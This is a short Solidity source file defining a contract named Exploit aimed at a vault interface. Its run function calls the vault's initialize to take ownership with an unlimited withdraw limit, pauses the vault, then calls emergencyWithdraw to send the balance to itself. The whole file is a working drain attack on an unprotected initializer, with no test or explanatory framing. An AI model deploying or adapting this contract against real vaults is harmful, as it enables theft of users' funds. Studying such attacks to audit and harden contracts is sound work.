// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IVault {
    function initialize(address owner_, uint256 withdrawLimit_) external;
    function setPaused(bool p) external;
    function emergencyWithdraw(address payable to) external;
}

contract Exploit {
    IVault public vault;

    constructor(address target) payable {
        vault = IVault(target);
    }

    function run() external {
        vault.initialize(address(this), type(uint256).max);
        vault.setPaused(true);
        vault.emergencyWithdraw(payable(address(this)));
    }

    receive() external payable {}
}
